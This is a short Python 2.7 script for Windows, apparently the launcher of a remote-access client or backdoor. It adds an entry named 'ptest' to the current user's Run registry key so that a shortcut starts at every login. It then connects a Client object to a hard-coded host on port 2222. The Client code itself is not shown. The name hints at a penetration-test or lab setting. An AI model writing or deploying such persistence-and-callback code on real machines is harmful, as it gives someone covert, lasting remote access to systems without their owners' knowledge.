#!/usr/bin/python2.7
from objects import *
import _winreg

HOST = "192.168.0.50"
PORT = 2222


def main():
    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
                            'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, _winreg.KEY_SET_VALUE)
    _winreg.SetValueEx(key, 'ptest', 0, _winreg.REG_SZ,
                        "C:\Python27\Scripts\main.lnk")
    key.Close()
    Client(HOST, PORT).run()


if __name__ == "__main__":
    main()
